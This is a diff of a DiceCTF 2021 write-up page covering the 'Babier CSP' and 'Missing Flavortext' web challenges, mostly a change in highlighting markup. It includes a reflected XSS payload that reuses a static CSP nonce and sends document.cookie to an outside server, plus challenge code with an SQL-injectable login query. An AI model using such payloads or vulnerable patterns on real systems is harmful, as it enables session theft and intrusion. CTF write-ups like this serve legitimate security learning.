@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Vie ">
 <meta name="description" content="Babier CSP The challenge takes after justCTF&amp;rsquo;s similarly named challenge. We&amp;rsquo;re given an index.js file:
-const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`}&amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?" />
+const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`} &amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?" />
 <meta name="keywords" content=", writeups, xss, sqli, web, prototype-pollution, csrf" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#0c0c0d" />
@@ -44,16 +44,16 @@ const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;
 
 <meta itemprop="name" content="DiceCTF 2021">
 <meta itemprop="description" content="Babier CSP The challenge takes after justCTF&rsquo;s similarly named challenge. We&rsquo;re given an index.js file:
-const express = require(&#39;express&#39;); const crypto = require(&#34;crypto&#34;); const config = require(&#34;./config.js&#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;); const template = name =&gt; ` &lt;html&gt; ${name === &#39;&#39; ? &#39;&#39;: `&lt;h1&gt;${name}&lt;/h1&gt;`}&lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt; &lt;script nonce=${NONCE}&gt; elem.onclick = () =&gt; { location = &#34;/?"><meta itemprop="datePublished" content="2021-02-07T19:06:12-07:00" />
+const express = require(&#39;express&#39;); const crypto = require(&#34;crypto&#34;); const config = require(&#34;./config.js&#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;); const template = name =&gt; ` &lt;html&gt; ${name === &#39;&#39; ? &#39;&#39;: `&lt;h1&gt;${name}&lt;/h1&gt;`} &lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt; &lt;script nonce=${NONCE}&gt; elem.onclick = () =&gt; { location = &#34;/?"><meta itemprop="datePublished" content="2021-02-07T19:06:12-07:00" />
 <meta itemprop="dateModified" content="2021-02-07T19:06:12-07:00" />
-<meta itemprop="wordCount" content="2260"><meta itemprop="image" content="https://jamvie.net/img/V.png"/>
+<meta itemprop="wordCount" content="2261"><meta itemprop="image" content="https://jamvie.net/img/V.png"/>
 <meta itemprop="keywords" content="writeups,xss,sqli,web,prototype-pollution,csrf," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://jamvie.net/img/V.png"/>
 
 <meta name="twitter:title" content="DiceCTF 2021"/>
 <meta name="twitter:description" content="Babier CSP The challenge takes after justCTF&rsquo;s similarly named challenge. We&rsquo;re given an index.js file:
-const express = require(&#39;express&#39;); const crypto = require(&#34;crypto&#34;); const config = require(&#34;./config.js&#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;); const template = name =&gt; ` &lt;html&gt; ${name === &#39;&#39; ? &#39;&#39;: `&lt;h1&gt;${name}&lt;/h1&gt;`}&lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt; &lt;script nonce=${NONCE}&gt; elem.onclick = () =&gt; { location = &#34;/?"/>
+const express = require(&#39;express&#39;); const crypto = require(&#34;crypto&#34;); const config = require(&#34;./config.js&#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;); const template = name =&gt; ` &lt;html&gt; ${name === &#39;&#39; ? &#39;&#39;: `&lt;h1&gt;${name}&lt;/h1&gt;`} &lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt; &lt;script nonce=${NONCE}&gt; elem.onclick = () =&gt; { location = &#34;/?"/>
 
 
 
@@ -63,7 +63,7 @@ const express = require(&#39;express&#39;); const crypto = require(&#34;crypto&#
 
 
 
-    <meta property="article:published_time" content="2021-02-07 19:06:12 -0700 -0700" />
+    <meta property="article:published_time" content="2021-02-07 19:06:12 -0700 MST" />
 
 
 
@@ -174,41 +174,41 @@ if (!doNotTrack) {
             <div class="post-content">
                 <h2 id="babier-csp">Babier CSP</h2>
 <p>The challenge takes after justCTF&rsquo;s <a href="https://jamvie.net/posts/2021/01/justctf-2020-a-collection-of-web-problems/#baby-csp">similarly named challenge</a>. We&rsquo;re given an <code>index.js</code> file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>);
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;./config.js&#34;</span>);
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>;
-
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SECRET</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">secret</span>;
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">NONCE</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">16</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
-
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span> =&gt; <span style="color:#e6db74">`
-</span><span style="color:#e6db74">&lt;html&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`&lt;h1&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&lt;script nonce=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">NONCE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;
-</span><span style="color:#e6db74">elem.onclick = () =&gt; {
-</span><span style="color:#e6db74">  location = &#34;/?name=&#34; + encodeURIComponent([&#34;apple&#34;, &#34;orange&#34;, &#34;pineapple&#34;, &#34;pear&#34;][Math.floor(4 * Math.random())]);
-</span><span style="color:#e6db74">}
-</span><span style="color:#e6db74">&lt;/script&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&lt;/html&gt;
-</span><span style="color:#e6db74">`</span>;
-
-<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>, <span style="color:#e6db74">`default-src none; script-src &#39;nonce-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">NONCE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>);
-  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;&#34;</span>));
-})
-
-<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">SECRET</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/secret&#34;</span>));
-
-<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
-  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Example app listening at http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
-})
-</code></pre></div><p>The main difference between Dice&rsquo;s challenge and justCatTheFish&rsquo;s is the hashing of the <code>NONCE</code> value. When this script is executed, it sets the <code>NONCE</code> value once, and it doesn&rsquo;t change values once this server is running.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;./config.js&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SECRET</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">secret</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">NONCE</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">16</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span> =&gt; <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`&lt;h1&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;script nonce=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">NONCE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">elem.onclick = () =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  location = &#34;/?name=&#34; + encodeURIComponent([&#34;apple&#34;, &#34;orange&#34;, &#34;pineapple&#34;, &#34;pear&#34;][Math.floor(4 * Math.random())]);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>, <span style="color:#e6db74">`default-src none; script-src &#39;nonce-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">NONCE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;&#34;</span>));
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">SECRET</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/secret&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Example app listening at http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>The main difference between Dice&rsquo;s challenge and justCatTheFish&rsquo;s is the hashing of the <code>NONCE</code> value. When this script is executed, it sets the <code>NONCE</code> value once, and it doesn&rsquo;t change values once this server is running.</p>
 <p>In justCatTheFish&rsquo;s challenge, the <code>NONCE</code> value is hashed every time a request is made, sufficiently randomizing the value. However, for this challenge, we can easily get the <code>NONCE</code> value from the content security policy and incorporate it into our input so it will be accepted.</p>
 <p>We can do a reflected XSS attack by specifying a <code>?name=</code> query parameter, so we would inject a script tag in the URL. We need to specify the right <code>NONCE</code> value, which we can see by accessing the page:</p>
 
@@ -216,157 +216,157 @@ if (!doNotTrack) {
 
 
 <p>And so we format our payload as:</p>
-<pre><code class="language-URL" data-lang="URL">https://babier-csp.dicec.tf/?name=&lt;script+nonce=LRGWAXOY98Es0zz0QOVmag==&gt;document.location='server.com?cookie='%2Bbtoa(document.cookie)&lt;/script&gt;
+<pre tabindex="0"><code class="language-URL" data-lang="URL">https://babier-csp.dicec.tf/?name=&lt;script+nonce=LRGWAXOY98Es0zz0QOVmag==&gt;document.location=&#39;server.com?cookie=&#39;%2Bbtoa(document.cookie)&lt;/script&gt;
 </code></pre><p>We grab the secret in the cookie and use that value to access the flag.</p>
-<pre><code>https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/
+<pre tabindex="0"><code>https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/
 </code></pre>
     <img src="https://jamvie.net/images/DiceCTF2021_BabierCSPFlag.png"  alt="sa256"  class="center"  style="border-radius: 8px;"  />
 
 
 <h2 id="missing-flavortext">Missing Flavortext</h2>
 <p>We are given a single login page, and an <code>index.js</code> file (Some parts omitted to show what is relevant):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
-
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
-
-<span style="color:#75715e">// parse json and serve static files
-</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }));
-<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#39;static&#39;</span>));
-
-<span style="color:#75715e">// login route
-</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>) {
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
-  }
-
-  <span style="color:#66d9ef">if</span> ([<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>].<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">v</span> =&gt; <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;\&#39;&#39;</span>))) {
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
-  }
-
-  <span style="color:#75715e">// see if user is in database
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`SELECT id FROM users WHERE
-</span><span style="color:#e6db74">    username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; AND
-</span><span style="color:#e6db74">    password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">  `</span>;
-
-  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span>;
-  <span style="color:#66d9ef">try</span> { <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">query</span>).<span style="color:#a6e22e">get</span>()<span style="color:#f92672">?</span>.<span style="color:#a6e22e">id</span> } <span style="color:#66d9ef">catch</span> {
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
-  }
-
-  <span style="color:#75715e">// correct login
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">id</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#e6db74">&#39;flag.html&#39;</span>, { <span style="color:#a6e22e">root</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">__dirname</span> });
-
-  <span style="color:#75715e">// incorrect login
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
-});
-</code></pre></div><p>Earlier we saw that we needed to log in as the user <code>admin</code>, and there&rsquo;s an sqlite database holding the user credentials. We&rsquo;re not given much feedback - if we give a set of invalid credentials, or an issue with the database occurs, or the <code>username</code> and <code>password</code> parameters aren&rsquo;t set, OR either of those parameters contain a <code>'</code> single quote, we are redirected back to the index.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// parse json and serve static files
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#39;static&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// login route
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ([<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>].<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">v</span> =&gt; <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;\&#39;&#39;</span>))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// see if user is in database
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`SELECT id FROM users WHERE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; AND
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  `</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> { <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">query</span>).<span style="color:#a6e22e">get</span>()<span style="color:#f92672">?</span>.<span style="color:#a6e22e">id</span> } <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// correct login
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">id</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#e6db74">&#39;flag.html&#39;</span>, { <span style="color:#a6e22e">root</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">__dirname</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// incorrect login
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Earlier we saw that we needed to log in as the user <code>admin</code>, and there&rsquo;s an sqlite database holding the user credentials. We&rsquo;re not given much feedback - if we give a set of invalid credentials, or an issue with the database occurs, or the <code>username</code> and <code>password</code> parameters aren&rsquo;t set, OR either of those parameters contain a <code>'</code> single quote, we are redirected back to the index.
